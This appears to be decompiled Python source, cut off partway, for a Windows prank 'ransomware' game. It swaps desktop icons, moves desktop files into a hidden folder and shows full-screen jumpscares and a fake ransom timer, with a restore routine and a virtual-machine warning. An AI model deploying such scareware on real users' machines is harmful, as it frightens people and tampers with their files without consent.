"""
It is HEAVILY recommended to run this program in a Virtual Machine, which will prevent your REAL COMPUTER from getting
affected.

Link to a good VM I know:
https://www.virtualbox.org/

You can also use others, just make sure its using Windows 10/11 as the virtual OS.
"""
global success_window
global punish
global _icons_applied
global lose_jumpscare_window
global ransom_flash_overlay
import sys
import os
import random
import subprocess
import win32com.client
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import shutil
import json
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QGraphicsOpacityEffect, QFrame, QHBoxLayout
from PyQt5.QtCore import Qt, QTimer, QUrl, QPropertyAnimation
from PyQt5.QtGui import QPixmap, QImage, QColor
from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent, QSoundEffect
from pynput import mouse, keyboard
ICON_FILE = 'stop_sign.ico'
BACKUP_FILENAME = 'icon_backup.json'
HIDDEN_FOLDER_NAME = 'hidden_originals'
_icons_applied = False
def _icons_state_dir():
    d = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), 'RansomIconState')
    os.makedirs(d, exist_ok=True)
    return d
def _icons_backup_path():
    return os.path.join(_icons_state_dir(), BACKUP_FILENAME)
def _icons_hidden_dir():
    d = os.path.join(_icons_state_dir(), HIDDEN_FOLDER_NAME)
    os.makedirs(d, exist_ok=True)
    return d

def _known_folder_desktop():
    """Ask Windows for the real Desktop path (handles OneDrive redirect)."""
    import ctypes
    from ctypes import wintypes

    class GUID(ctypes.Structure):
        _fields_ = [
            ('Data1', wintypes.DWORD),
            ('Data2', wintypes.WORD),
            ('Data3', wintypes.WORD),
            ('Data4', ctypes.c_ubyte * 8)
        ]

    try:
        desktop_guid = GUID(
            3032468538,
            56108,
            16972,
            (ctypes.c_ubyte * 8)(
                176, 41, 127, 233, 154, 135, 198, 65
            )
        )

        path_ptr = ctypes.c_wchar_p()

        result = ctypes.windll.shell32.SHGetKnownFolderPath(
            ctypes.byref(desktop_guid),
            0,
            None,
            ctypes.byref(path_ptr)
        )

        if result == 0 and path_ptr.value:
            path = path_ptr.value
            ctypes.windll.ole32.CoTaskMemFree(path_ptr)
            return path

    except Exception:
        pass

def _desktop_folders():
    """Return every folder that Windows treats as a desktop."""
    folders = []
    real = _known_folder_desktop()
    if real and os.path.isdir(real):
            folders.append(real)
    public = os.path.join(os.environ.get('PUBLIC', 'C:\\Users\\Public'), 'Desktop')
    if os.path.isdir(public) and public not in folders:
            folders.append(public)
    naive = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    if os.path.isdir(naive) and naive not in folders:
            folders.append(naive)
    print(f'[icons] Desktop folders: {folders}')
    return folders
def _set_attr(path, mask, on):
    attrs = windll.kernel32.GetFileAttributesW(str(path))
    if attrs == (-1):
        return
    else:
        new = attrs | mask if on else attrs & ~mask
        windll.kernel32.SetFileAttributesW(str(path), new)

def _shchange_notify():
    """Broadcast a shell change so icon updates appear immediately."""
    try:
        SHCNE_ASSOCCHANGED = 0x08000000
        SHCNF_IDLIST = 0x0000
        windll.shell32.SHChangeNotify(
            SHCNE_ASSOCCHANGED, SHCNF_IDLIST, None, None
        )
    except Exception as e:
        print(f'[shell] SHChangeNotify failed: {e}')
       
def _refresh_shell_icons():
    try:
        os.system('ie4uinit.exe -show')
    except Exception:
        pass
    _shchange_notify()
    
def _load_icon_backup():
    p = _icons_backup_path()

    if not os.path.exists(p):
        return {}

    try:
        with open(p, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}
def _save_icon_backup(backup):
    try:
        with open(_icons_backup_path(), 'w', encoding='utf-8') as f:
            json.dump(backup, f, indent=2)
    except Exception:
        return None

def build_icon_backup(ico):
    """Scan desktops and record the ORIGINAL state of everything we'll touch.

    Does NOT modify anything. Writes the backup JSON to disk and returns it.
    Format matches what restore_desktop_icons() expects:
        'lnk::<path>'  -> original IconLocation string
        'url::<path>'  -> original file contents string
        'dir::<path>'  -> True (marker that we wrote a desktop.ini)
        'file::<lnk>'  -> {'lnk_path', 'hidden_path', 'original_name'}
    """
    backup = _load_icon_backup()
    if backup:
        # Already have a backup — don't clobber it.
        print('[backup] existing backup found, reusing.')
        return backup

    backup = {}
    shell = win32com.client.Dispatch('WScript.Shell')
    hidden_dir = _icons_hidden_dir()

    for folder in _desktop_folders():
        try:
            names = os.listdir(folder)
        except Exception:
            continue

        for name in names:
            if name.lower() == 'desktop.ini':
                continue

            full = os.path.join(folder, name)
            low = name.lower()

            try:
                if low.endswith('.lnk'):
                    sc = shell.CreateShortCut(full)
                    backup[f'lnk::{full}'] = sc.IconLocation

                elif low.endswith('.url'):
                    with open(full, 'r', encoding='utf-8') as f:
                        backup[f'url::{full}'] = f.read()

                elif os.path.isdir(full):
                    # We only need a marker; restore deletes the ini we write.
                    backup[f'dir::{full}'] = True

                else:
                    # Regular file: hide the real one, drop a .lnk with the new icon.
                    hidden_path = os.path.join(hidden_dir, name)
                    if os.path.exists(hidden_path):
                        hidden_path = os.path.join(
                            hidden_dir, f'{id(full):x}_{name}'
                        )
                    lnk_path = full + '.lnk'
                    backup[f'file::{lnk_path}'] = {
                        'lnk_path': lnk_path,
                        'hidden_path': hidden_path,
                        'original_name': name,
                    }
            except Exception as e:
                print(f'[backup] skipped {full}: {e}')

    _save_icon_backup(backup)
    print(f'[backup] recorded {len(backup)} entries.')
    return backup


def apply_desktop_icons():
    """Change every desktop icon to stop_sign.ico.

    Idempotent: safe to run again after an Explorer restart. Uses a
    pre-built backup so a mid-run crash is still fully recoverable.
    """
    global _icons_applied

    ico = resource_path(ICON_FILE)
    if not os.path.isfile(ico):
        print(f'ERROR: icon file not found: {ico}')
        return
    ico = os.path.abspath(ico)

    # Build the backup FIRST, before mutating anything.
    backup = build_icon_backup(ico)
    if not backup:
        print('[apply] nothing to do (empty desktop?).')
        return

    shell = win32com.client.Dispatch('WScript.Shell')

    for key, value in backup.items():
        try:
            if key.startswith('lnk::'):
                lnk = key[5:]
                if os.path.exists(lnk):
                    sc = shell.CreateShortCut(lnk)
                    sc.IconLocation = ico
                    sc.Save()

            elif key.startswith('url::'):
                url = key[5:]
                if os.path.exists(url):
                    with open(url, 'w', encoding='utf-8') as f:
                        f.write('[InternetShortcut]\n')
                        f.write(f'URL={url}\n')
                        f.write(f'IconFile={ico}\n')
                        f.write('IconIndex=0\n')

            elif key.startswith('dir::'):
                folder = key[5:]
                if os.path.isdir(folder):
                    ini = os.path.join(folder, 'desktop.ini')
                    with open(ini, 'w', encoding='utf-8') as f:
                        f.write('[.ShellClassInfo]\n')
                        f.write(f'IconResource={ico},0\n')
                    _set_attr(ini, 2, True)     # hidden
                    _set_attr(folder, 1, True)  # read-only (required for folder icons)

            elif key.startswith('file::'):
                info = value
                full = key[6:]
                # Skip if we've already relocated this file on a prior run.
                if (os.path.exists(full)
                        and not os.path.exists(info['hidden_path'])):
                    os.makedirs(os.path.dirname(info['hidden_path']), exist_ok=True)
                    shutil.move(full, info['hidden_path'])
                    sc = shell.CreateShortCut(info['lnk_path'])
                    sc.TargetPath = info['hidden_path']
                    sc.IconLocation = ico
                    sc.Save()

        except Exception as e:
            print(f'[apply] failed on {key}: {e}')

    _refresh_shell_icons()
    _icons_applied = True
    print('Desktop icons changed.')


def restore_desktop_icons():
    """Undo everything apply_desktop_icons() did. (unchanged from original)"""
    global _icons_applied
    backup = _load_icon_backup()
    if not backup:
        return
    else:
        shell = win32com.client.Dispatch('WScript.Shell')
        remaining = dict(backup)
        keys = sorted(backup.keys(), key=lambda k: 0 if k.startswith('file::') else 1)
        for key in keys:
            value = backup[key]
            try:
                if key.startswith('file::'):
                    info = value
                    if os.path.exists(info['lnk_path']):
                        os.remove(info['lnk_path'])
                    if os.path.exists(info['hidden_path']):
                        target = os.path.join(
                            os.path.dirname(info['lnk_path']),
                            info['original_name']
                        )
                        shutil.move(info['hidden_path'], target)
                    remaining.pop(key, None)
                else:
                    if key.startswith('lnk::'):
                        lnk = key[5:]
                        if os.path.exists(lnk):
                            sc = shell.CreateShortCut(lnk)
                            sc.IconLocation = value
                            sc.Save()
                        remaining.pop(key, None)
                    else:
                        if key.startswith('url::'):
                            url = key[5:]
                            if os.path.exists(url):
                                with open(url, 'w', encoding='utf-8') as f:
                                    f.write(value)
                            remaining.pop(key, None)
                        else:
                            if key.startswith('dir::'):
                                folder = key[5:]
                                ini = os.path.join(folder, 'desktop.ini')
                                if os.path.exists(ini):
                                    _set_attr(ini, 2, False)
                                    try:
                                        os.remove(ini)
                                    except Exception:
                                        pass
                                if os.path.isdir(folder):
                                    _set_attr(folder, 1, False)
                                remaining.pop(key, None)
            except Exception:
                continue
        _save_icon_backup(remaining)
        _refresh_shell_icons()
        _icons_applied = False
        print('Desktop icons restored.')
TRIGGER_COOLDOWN = 5
RANSOM_BONUS_IMAGE = 'coin.jpg'
RANSOM_BONUS_CHANCE = 0.75
RANSOM_BONUS_CHECK_INTERVAL = 4000
RANSOM_FAKE_BONUS_CHANCE = 0.5
RANSOM_FAKE_BONUS_CHECK_INTERVAL = 4000
RANSOM_TIME = 78
RANSOM_GOLD = 500
GLITCH_IMAGES = ['glitch1.png', 'glitch2.jpg', 'glitch3.jpg', 'glitch4.jpg', 'glitch5.jpg', 'glitch6.jpg', 'glitch7.jpg', 'stop_sign.png', 'glitch6.jpg', 'stop_sign.png', 'stop_sign.png', 'stop_sign.png', 'stop_sign.png']
punish = False
success_window = None
lose_jumpscare_window = None
sound_manager = None
event_controller = None
ransom_flash_overlay = None
def resource_path(filename):
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, filename)
def load_pixmap(filename):
    path = resource_path(filename)
    image = QImage(path)
    if image.isNull():
        return QPixmap()
    else:
        image = image.convertToFormat(QImage.Format_RGBA8888)
        return QPixmap.fromImage(image)
desktop_paths = [os.path.join(os.environ['USERPROFILE'], 'Desktop'), 'C:\\Users\\Public\\Desktop']
class SoundManager:
    # ***<module>.SoundManager: Failure: Different bytecode
    """SoundManager"""
    def __init__(self):
        self.music = QMediaPlayer()
        self.ticking = QMediaPlayer()
        self.success = QMediaPlayer()
        self.effect_players = []
        for _ in range(6):
            player = QMediaPlayer()
            player.setVolume(100)
            self.effect_players.append(player)
        self.effect_index = 0
        self.sound_effects = {}
        self.media_cache = {}
        self.pending_music = None
        self.pending_ticking = False
        self.pending_success = False
        self.sound_files = ['start.mp3', 'fail.mp3', 'realscare.wav', 'time_ticking.wav', 'da song.mp3', 'success.mp3', 'coin_sound.mp3', 'laugh1.mp3', 'laugh2.mp3', 'blip.mp3']
        for filename in self.sound_files:
            self.preload_sound(filename)
        self.preload_sound_effect('realscare.wav')
        self.preload_sound_effect('time_ticking.wav')
        self.music.mediaStatusChanged.connect(self.music_media_status_changed)
        self.ticking.mediaStatusChanged.connect(self.ticking_media_status_changed)
        self.success.mediaStatusChanged.connect(self.success_media_status_changed)
        QTimer.singleShot(50, self.warmup_audio)
    def preload_sound(self, filename):
        if filename in self.media_cache:
            return self.media_cache[filename]
        else:
            path = resource_path(filename)
            if not os.path.exists(path):
                print(f'ERROR: Sound file not found: {path}')
                return
            else:
                media = QMediaContent(QUrl.fromLocalFile(path))
                self.media_cache[filename] = media
                return media
    def preload_sound_effect(self, filename):
        if filename in self.sound_effects:
            return self.sound_effects[filename]
        else:
            path = resource_path(filename)
            if not os.path.exists(path):
                print(f'ERROR: Sound file not found: {path}')
                return
            else:
                effect = QSoundEffect()
                effect.setSource(QUrl.fromLocalFile(path))
                effect.setVolume(1.0)
                self.sound_effects[filename] = effect
                return effect
    def warmup_audio(self):
        media = self.media_cache.get('da song.mp3')
        if media is not None:
            self.music.setMedia(media)
            self.music.setVolume(100)
        media = self.media_cache.get('time_ticking.wav')
        if media is not None:
            self.ticking.setMedia(media)
            self.ticking.setVolume(100)
        media = self.media_cache.get('success.mp3')
        if media is not None:
            self.success.setMedia(media)
            self.success.setVolume(100)
        warm_media = self.media_cache.get('blip.mp3')
        if warm_media is not None:
            for player in self.effect_players:
                player.setMedia(warm_media)
                player.setVolume(100)
    def play_music(self, filename):
        media = self.preload_sound(filename)
        if media is None:
            return
        else:
            self.pending_music = media
            self.music.stop()
            self.music.setMedia(media)
            self.music.setVolume(100)
            if self.music.mediaStatus() in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                self.pending_music = None
                self.music.play()
    def music_media_status_changed(self, status):
        if status in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia) and self.pending_music is not None:
                self.pending_music = None
                self.music.setVolume(100)
                self.music.play()
    def stop_music(self):
        self.pending_music = None
        self.music.stop()
    def play_ticking(self):
        if self.ticking.state() == QMediaPlayer.PlayingState:
            return
        else:
            effect = self.sound_effects.get('time_ticking.wav')
            if effect is not None:
                effect.setLoopCount(QSoundEffect.Infinite)
                effect.setVolume(1.0)
                effect.play()
                return
            else:
                media = self.preload_sound('time_ticking.wav')
                if media is None:
                    return
                else:
                    self.pending_ticking = True
                    self.ticking.stop()
                    self.ticking.setMedia(media)
                    self.ticking.setVolume(100)
                    if self.ticking.mediaStatus() in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                        self.pending_ticking = False
                        self.ticking.play()
    def ticking_media_status_changed(self, status):
        if status in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia) and self.pending_ticking:
                self.pending_ticking = False
                self.ticking.setVolume(100)
                self.ticking.play()
    def stop_ticking(self):
        self.pending_ticking = False
        effect = self.sound_effects.get('time_ticking.wav')
        if effect is not None:
            effect.stop()
        self.ticking.stop()
    def play_effect(self, filename):
        if filename.lower().endswith('.wav'):
            effect = self.sound_effects.get(filename)
            if effect is None:
                effect = self.preload_sound_effect(filename)
            if effect is not None:
                effect.setLoopCount(1)
                effect.setVolume(1.0)
                effect.play()
                return
        media = self.preload_sound(filename)
        if media is None:
            return
        else:
            player = None
            for candidate in self.effect_players:
                if candidate.state() != QMediaPlayer.PlayingState:
                    player = candidate
                    break
            if player is None:
                player = self.effect_players[self.effect_index]
                self.effect_index = (self.effect_index + 1) % len(self.effect_players)
            player.stop()
            player.setMedia(media)
            player.setVolume(100)
            if player.mediaStatus() in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                player.play()
            else:
                def play_when_loaded(status, p=player):
                    if status in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                        try:
                            p.play()
                            p.mediaStatusChanged.disconnect(play_when_loaded)
                        except RuntimeError:
                            return None
                player.mediaStatusChanged.connect(play_when_loaded)
    def play_success(self):
        media = self.preload_sound('success.mp3')
        if media is None:
            return
        else:
            self.pending_success = True
            self.success.stop()
            self.success.setMedia(media)
            self.success.setVolume(100)
            if self.success.mediaStatus() in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia):
                self.pending_success = False
                self.success.play()
    def success_media_status_changed(self, status):
        if status in (QMediaPlayer.LoadedMedia, QMediaPlayer.BufferedMedia) and self.pending_success:
            self.pending_success = False
            self.success.setVolume(100)
            self.success.play()
        else:
            if status == QMediaPlayer.EndOfMedia:
                QTimer.singleShot(100, QApplication.quit)
    def stop_all(self):
        self.pending_music = None
        self.pending_ticking = False
        self.pending_success = False
        self.music.stop()
        self.ticking.stop()
        self.success.stop()
        for player in self.effect_players:
            player.stop()
        for effect in self.sound_effects.values():
            try:
                effect.stop()
            except Exception:
                pass
    __classdictcell__ = None
class SuccessWindow(QWidget):
    """SuccessWindow"""
    def __init__(self):
        super().__init__()
        self.setWindowTitle('RANSOM')
        self.setWindowFlags(Qt.Window | Qt.WindowCloseButtonHint | Qt.WindowMinimizeButtonHint)
        self.resize(700, 500)
        self.setStyleSheet('background-color: black;')
        self.image = QLabel(self)
        self.image.setAlignment(Qt.AlignCenter)
        self.image.setGeometry(0, 0, self.width(), self.height())
        self.update_image()
        self.image.show()
        sound_manager.play_success()
    def update_image(self):
        pixmap = load_pixmap('success.png')
        if not pixmap.isNull():
            pixmap = pixmap.scaled(self.width(), self.height(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self.image.setPixmap(pixmap)
    def resizeEvent(self, event):
        self.image.setGeometry(0, 0, self.width(), self.height())
        self.update_image()
        event.accept()
class JumpscareWindow(QWidget):
    """JumpscareWindow"""
    def __init__(self, image_path):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setStyleSheet('background-color: rgb(90, 0, 0);')
        self.showFullScreen()
        self.original_pixmap = load_pixmap(image_path)
        self.static_background = QLabel(self)
        self.static_background.setGeometry(0, 0, self.width(), self.height())
        self.static_background.setScaledContents(True)
        self.static_background.show()
        self.static_background.lower()
        self.static_timer = QTimer(self)
        self.static_timer.timeout.connect(self.make_static)
        self.static_timer.start(35)
        self.make_static()
        self.image = QLabel(self)
        self.image.setAttribute(Qt.WA_TranslucentBackground)
        self.image.setStyleSheet('background: transparent; border: none;')
        self.image.setAlignment(Qt.AlignCenter)
        self.start_width = self.original_pixmap.width()
        self.start_height = self.original_pixmap.height()
        self.start_scale = 1.3
        self.end_scale = 2.5
        self.elapsed = 0
        self.progress_background = QLabel(self)
        self.progress_background.setStyleSheet('\n\t\t\tbackground-color: rgb(20, 20, 20);\n\t\t\tborder: 3px solid rgb(0, 0, 0);\n\t\t\t')
        self.progress_background.hide()
        self.progress_fill = QLabel(self.progress_background)
        self.progress_fill.setStyleSheet('background-color: rgb(255, 255, 255);')
        self.download_label = QLabel('DOWNLOADING...', self)
        self.download_label.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tfont-size: 28px;\n\t\t\tfont-weight: bold;\n\t\t\tbackground: transparent;\n\t\t\t')
        self.download_label.adjustSize()
        self.download_label.hide()
        self.percent_label = QLabel('0%', self)
        self.percent_label.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tfont-size: 24px;\n\t\t\tfont-weight: bold;\n\t\t\tbackground: transparent;\n\t\t\t')
        self.percent_label.adjustSize()
        self.percent_label.hide()
        self.glitch_labels = []
        glitch_texts = ['DOWNLOADING...', 'D0WNLOAD1NG...', 'DOWNL0ADING...', 'DOWNLOAD_', 'DOWNLOAD ERROR', 'DOWNLOADING', 'D0WNLOAD', 'DOWNLOAD...', 'DOWNLOADING..', 'D0WNLOAD1NG', 'DOWNLOAD FILE', 'DOWNLOADING DATA']
        for _ in range(8):
            label = QLabel(random.choice(glitch_texts), self)
            label.setStyleSheet(f'\n\t\t\t\tcolor: rgb(\n\t\t\t\t\t{random.randint(180, 255)},\n\t\t\t\t\t{random.randint(180, 255)},\n\t\t\t\t\t{random.randint(180, 255)}\n\t\t\t\t);\n\t\t\t\tfont-size: {random.randint(24, 50)}px;\n\t\t\t\tfont-weight: bold;\n\t\t\t\tbackground: transparent;\n\t\t\t\t')
            label.adjustSize()
            label.hide()
            self.glitch_labels.append(label)
        self.download_timer = None
        self.download_elapsed = 0
        self.download_progress = 0
        self.animation_timer = QTimer(self)
        self.animation_timer.timeout.connect(self.animate)
        self.animation_timer.start(16)
    def make_static(self):
        width = 160
        height = 90
        image = QImage(width, height, QImage.Format_RGB32)
        for y in range(height):
            for x in range(width):
                noise = random.randint((-35), 35)
                r = max(0, min(255, 65 + noise))
                g = max(0, min(255, 2 + noise // 4))
                b = max(0, min(255, 2 + noise // 4))
                image.setPixelColor(x, y, QColor(r, g, b))
        image = image.scaled(self.width(), self.height(), Qt.IgnoreAspectRatio, Qt.FastTransformation)
        self.static_background.setPixmap(QPixmap.fromImage(image))
    def animate(self):
        self.elapsed += 16
        progress = min(self.elapsed / 1000, 1.0)
        scale = self.start_scale + (self.end_scale - self.start_scale) * progress
        width = int(self.start_width * scale)
        height = int(self.start_height * scale)
        pixmap = self.original_pixmap.scaled(width, height, Qt.KeepAspectRatio, Qt.FastTransformation)
        self.image.setPixmap(pixmap)
        self.image.resize(width, height)
        shake = int(8 + 35 * progress)
        center_x = (self.width() - width) // 2
        center_y = (self.height() - height) // 2
        self.image.move(center_x + random.randint(-shake, shake), center_y + random.randint(-shake, shake))
        self.image.show()
        self.image.raise_()
        if progress >= 1:
            self.animation_timer.stop()
            self.image.move(center_x, center_y)
            QTimer.singleShot(100, self.start_download)
    def start_download(self):
        self.image.hide()
        self.static_timer.stop()
        self.static_background.setStyleSheet('background-color: rgb(55, 0, 0);')
        self.static_background.setPixmap(QPixmap())
        self.static_background.show()
        self.static_background.lower()
        self.download_elapsed = 0
        self.download_progress = 0
        self.progress_background.setGeometry((self.width() - 600) // 2, (self.height() - 45) // 2, 600, 45)
        self.progress_fill.setGeometry(0, 0, 0, 45)
        self.progress_background.show()
        self.download_label.setText('DOWNLOADING...')
        self.download_label.adjustSize()
        self.download_label.move((self.width() - self.download_label.width()) // 2, self.height() // 2 - 80)
        self.download_label.show()
        self.percent_label.setText('0%')
        self.percent_label.adjustSize()
        self.percent_label.move((self.width() - self.percent_label.width()) // 2, self.height() // 2 + 55)
        self.percent_label.show()
        for label in self.glitch_labels:
            label.show()
        self.update_glitch_text()
        self.download_timer = QTimer(self)
        self.download_timer.timeout.connect(self.update_download)
        self.download_timer.start(7)
    def update_download(self):
        self.download_elapsed += 50
        self.download_progress = min(100, self.download_elapsed / 5000 * 100)
        zoom = 1.0 + self.download_progress / 100 * 0.8
        base_width = 600
        base_height = 45
        bar_width = int(base_width * zoom)
        bar_height = int(base_height * zoom)
        bar_x = (self.width() - bar_width) // 2
        bar_y = (self.height() - bar_height) // 2
        self.progress_background.setGeometry(bar_x, bar_y, bar_width, bar_height)
        if self.download_progress >= 100:
            self.finish_download(bar_x, bar_y, bar_width, bar_height, zoom)
        else:
            normal_width = int(bar_width * self.download_progress / 100)
            glitch_strength = int(35 * zoom)
            fill_width = max(0, min(bar_width, normal_width + random.randint(-glitch_strength, glitch_strength)))
            self.progress_fill.setGeometry(0, random.randint(int((-5) * zoom), int(5 * zoom)), fill_width, random.randint(int(38 * zoom), int(52 * zoom)))
            percent = int(self.download_progress)
            if random.random() < 0.25:
                percent = max(0, min(99, percent + random.randint((-10), 10)))
            self.percent_label.setText(f'{percent}%')
            font = self.percent_label.font()
            font.setPointSize(max(1, int(24 * zoom)))
            font.setBold(True)
            self.percent_label.setFont(font)
            self.percent_label.adjustSize()
            self.percent_label.move((self.width() - self.percent_label.width()) // 2 + random.randint(int((-10) * zoom), int(10 * zoom)), bar_y + bar_height + int(55 * zoom) + random.randint(int((-5) * zoom), int(5 * zoom)))
            if random.random() < 0.35:
                self.download_label.setText(random.choice(['DOWNLOADING...', 'DOWNLOADING..', 'D0WNLOAD1NG...', 'DOWNL0ADING...', 'DOWNLOAD_', 'DOWNLOADING', 'D0WNLOAD', 'DOWNLOAD...', 'D0WNLOAD1NG', 'DOWNLOAD FILE']))
            font = self.download_label.font()
            font.setPointSize(max(1, int(28 * zoom)))
            font.setBold(True)
            self.download_label.setFont(font)
            self.download_label.adjustSize()
            self.download_label.move((self.width() - self.download_label.width()) // 2 + random.randint(int((-15) * zoom), int(15 * zoom)), bar_y - self.download_label.height() - int(20 * zoom) + random.randint(int((-8) * zoom), int(8 * zoom)))
            self.update_glitch_text()
    def finish_download(self, bar_x, bar_y, bar_width, bar_height, zoom):
        self.download_timer.stop()
        self.progress_fill.setGeometry(0, 0, bar_width, bar_height)
        self.percent_label.setText('100%')
        font = self.percent_label.font()
        font.setPointSize(int(24 * zoom))
        font.setBold(True)
        self.percent_label.setFont(font)
        self.percent_label.adjustSize()
        self.percent_label.move((self.width() - self.percent_label.width()) // 2, bar_y + bar_height + int(55 * zoom))
        for label in self.glitch_labels:
            label.hide()
        self.download_label.hide()
        self.damage_flash = QLabel(self)
        self.damage_flash.setGeometry(0, 0, self.width(), self.height())
        self.damage_flash.setStyleSheet('background-color: rgb(255, 0, 0);')
        self.damage_opacity = QGraphicsOpacityEffect(self.damage_flash)
        self.damage_flash.setGraphicsEffect(self.damage_opacity)
        self.damage_opacity.setOpacity(1)
        self.damage_flash.show()
        self.damage_fade = QPropertyAnimation(self.damage_opacity, b'opacity', self)
        self.damage_fade.setDuration(2)
        self.damage_fade.setStartValue(1)
        self.damage_fade.setEndValue(0)
        self.damage_fade.finished.connect(self.damage_flash.hide)
        self.damage_fade.start()
        QTimer.singleShot(5, self.close)
    def update_glitch_text(self):
        texts = ['DOWNLOADING...', 'DOWNLOADING..', 'D0WNLOAD1NG...', 'DOWNL0ADING...', 'DOWNLOAD_', 'DOWNLOAD ERROR', 'DOWNLOADING', 'D0WNLOAD', 'DOWNLOAD...', 'D0WNLOAD1NG', 'DOWNLOAD FILE', 'DOWNLOADING DATA']
        for label in self.glitch_labels:
            if random.random() < 0.4:
                label.setText(random.choice(texts))
                label.adjustSize()
            x = random.randint(30, max(30, self.width() - label.width() - 30))
            y = random.randint(30, max(30, self.height() - label.height() - 30))
            if self.height() // 2 - 130 < y < self.height() // 2 + 130:
                    if random.random() < 0.75:
                        if random.random() < 0.5:
                            y = random.randint(30, max(30, self.height() // 2 - 150))
                        else:
                            y = random.randint(min(self.height() - 80, self.height() // 2 + 150), self.height() - 30)
            label.move(x + random.randint((-8), 8), y + random.randint((-8), 8))
            label.raise_()
    def closeEvent(self, event):
        self.animation_timer.stop()
        self.static_timer.stop()
        if self.download_timer:
            self.download_timer.stop()
        event.accept()
class RansomImageWindow(QWidget):
    # ***<module>.RansomImageWindow: Failure: Different bytecode
    """RansomImageWindow"""
    def __init__(self, image_path, fake_bonus=False, ransom_window=None):
        super().__init__()
        self.fake_bonus = fake_bonus
        self.ransom_window = ransom_window
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.image = QLabel(self)
        self.image.setAttribute(Qt.WA_TranslucentBackground)
        self.image.setStyleSheet('background: transparent; border: none;')
        pixmap = load_pixmap(image_path)
        if not pixmap.isNull():
            self.image.setPixmap(pixmap)
            self.image.resize(pixmap.size())
            self.resize(pixmap.size())
        self.base_x = 0
        self.base_y = 0
        self.shiver_timer = QTimer(self)
        self.shiver_timer.timeout.connect(self.shiver)
        self.shiver_timer.start(35)
    def mousePressEvent(self, event):
        if self.fake_bonus and event.button() == Qt.LeftButton:
            self.collect_fake_bonus()
            event.accept()
        else:
            super().mousePressEvent(event)
    def collect_fake_bonus(self):
        sound_manager.play_effect(random.choice(['laugh1.mp3', 'laugh2.mp3']))
        try:
            if self.ransom_window is not None and self.ransom_window.isVisible():
                    self.ransom_window.required_gold += 50
                    self.ransom_window.update_gold_label()
        except RuntimeError:
            pass
        self.close()
    def shiver(self):
        self.move(self.base_x + random.randint((-3), 3), self.base_y + random.randint((-3), 3))
    def set_base_position(self, x, y):
        self.base_x = x
        self.base_y = y
        self.move(x, y)
    def closeEvent(self, event):
        self.shiver_timer.stop()
        event.accept()
class RansomTimerWindow(QWidget):
    """RansomTimerWindow"""
    def __init__(self, ransom_game):
        super().__init__()
        self.ransom_game = ransom_game
        self.required_gold = RANSOM_GOLD
        self.time_left = RANSOM_TIME
        self.setWindowFlags(Qt.Window | Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.resize(432, 294)
        self.setStyleSheet('background-color: black;')
        self.header = QLabel(self)
        self.header.setGeometry(0, 0, self.width(), 116)
        self.header.setStyleSheet('background-color: rgb(225, 0, 0); border: 3px solid black;')
        self.a90_image = QLabel(self)
        self.a90_image.setAttribute(Qt.WA_TranslucentBackground)
        self.a90_image.setStyleSheet('background: transparent; border: none;')
        pixmap = load_pixmap('A-90_IDLE.png')
        if not pixmap.isNull():
            pixmap = pixmap.scaled(106, 106, Qt.KeepAspectRatio, Qt.FastTransformation)
            self.a90_image.setPixmap(pixmap)
        self.a90_image.setGeometry(7, 5, 106, 106)
        self.a90_image.setAlignment(Qt.AlignCenter)
        self.header_text = QLabel('YOUR WORK IS IN\nCRITICAL DANGER', self)
        self.header_text.setGeometry(125, 10, 295, 96)
        self.header_text.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tfont-size: 25px;\n\t\t\tfont-weight: bold;\n\t\t\tbackground: transparent;\n\t\t\t')
        self.header_text.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        self.warning = QLabel('IF YOU DO NOT PAY THIS RANSOM\nBEFORE THE TIMER ENDS, YOUR FILES ICONS\nWILL BE UNRECOVERABLE BY ANY MEANS.', self)
        self.warning.setGeometry(9, 130, self.width() - 18, 72)
        self.warning.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tbackground-color: black;\n\t\t\tborder: 3px solid rgb(225, 0, 0);\n\t\t\tfont-size: 12px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.warning.setAlignment(Qt.AlignCenter)
        self.bottom_bar = QLabel(self)
        self.bottom_bar.setGeometry(0, 210, self.width(), 80)
        self.bottom_bar.setStyleSheet('\n\t\t\tbackground-color: rgb(225, 0, 0);\n\t\t\tborder: 3px solid black;\n\t\t\t')
        self.gold_box = QFrame(self)
        self.gold_box.setStyleSheet('\n\t\t\tQFrame {\n\t\t\t\tbackground-color: black;\n\t\t\t\tborder: 3px solid rgb(255, 235, 45);\n\t\t\t\tborder-radius: 0px;\n\t\t\t}\n\t\t\t')
        box_height = 60
        layout = QHBoxLayout(self.gold_box)
        layout.setContentsMargins(8, 4, 14, 4)
        layout.setSpacing(6)
        self.gold_icon = QLabel('⬢', self.gold_box)
